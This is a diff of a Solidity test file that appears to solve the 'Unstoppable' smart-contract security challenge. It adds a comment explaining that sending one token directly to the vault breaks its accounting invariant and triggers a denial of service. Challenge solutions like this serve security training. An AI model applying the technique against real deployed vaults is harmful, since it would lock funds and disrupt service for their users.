@@ -91,6 +91,7 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
+		// Directly transfer tokens to the vault to break accounting invariant and trigger a Denial of Service (DoS)
         token.transfer(address(vault), 1);
     }
 
